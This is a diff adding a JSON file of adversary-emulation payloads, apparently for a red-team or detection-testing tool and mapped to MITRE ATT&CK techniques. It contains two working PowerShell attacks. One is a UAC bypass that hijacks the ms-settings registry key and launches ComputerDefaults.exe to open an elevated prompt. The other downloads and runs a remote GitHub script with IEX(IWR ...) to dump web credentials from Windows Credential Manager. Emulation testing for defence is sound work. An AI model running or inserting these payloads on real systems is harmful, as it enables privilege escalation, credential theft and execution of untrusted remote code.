@@ -1,0 +1,52 @@
+[
+  {
+    "ID": "T1548.002",
+    "name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+    "atomic-testings": [
+      {
+        "payload_version": "02",
+        "payload_external_id": "c5abae56-d3a4-484e-b557-8632ed83a854",
+        "payload_type": "command",
+        "payload_name": "Bypass UAC using ComputerDefaults (PowerShell) - V2",
+        "payload_description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10. Upon execution, an administrative command prompt should open.",
+        "payload_platforms": [
+          "Windows"
+        ],
+        "payload_execution_arch": "ALL_ARCHITECTURES",
+        "payload_elevation_required": true,
+        "payload_arguments": [
+          {
+            "type": "path",
+            "key": "executable_binary",
+            "default_value": "C:\\Windows\\System32\\cmd.exe",
+            "description": "Binary to execute with UAC Bypass"
+          }
+        ],
+        "command_executor": "powershell",
+        "command_content": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"",
+        "payload_cleanup_executor": "powershell",
+        "payload_cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore"
+      }
+    ]
+  },
+  {
+    "ID": "T1555",
+    "name": "Credentials from Password Stores",
+    "atomic-testings": [
+      {
+        "payload_version": "01",
+        "payload_external_id": "ff414ab6-74b9-4409-b2ec-3207251cf19b",
+        "payload_type": "command",
+        "payload_name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
+        "payload_description": "This module will extract the credentials from Windows Credential Manager",
+        "payload_platforms": [
+          "Windows"
+        ],
+        "payload_execution_arch": "ALL_ARCHITECTURES",
+        "payload_elevation_required": false,
+        "command_executor": "powershell",
+        "command_content": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force"
+      }
+    ]
+  }
+]
